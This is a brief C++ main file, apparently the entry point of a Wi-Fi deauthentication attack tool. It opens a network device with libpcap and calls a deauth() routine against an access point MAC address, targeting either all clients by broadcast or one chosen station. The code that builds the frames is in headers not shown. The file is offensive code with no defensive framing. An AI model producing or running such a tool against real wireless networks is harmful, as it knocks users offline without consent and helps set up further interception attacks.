#include <iostream>
#include "pcap.h"
#include "send_deauth.h"
#include "mac.h"

#define DEAUTH_BROADCAST 0
#define DEAUTH_UNICAST 1

using std::string;

int main(int argc, char** argv){
    if(argc!=3 && argc!=4){
        usage();
        return 0;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    Mac apMac(argv[2]);
    Mac stationMac;
    if (argc==4)  stationMac = Mac(argv[3]);

    // BROADCAST
    if(argc==3) deauth(handle, apMac, Mac::broadcastMac());
    // UNICAST
    else        deauth(handle, apMac, stationMac);
}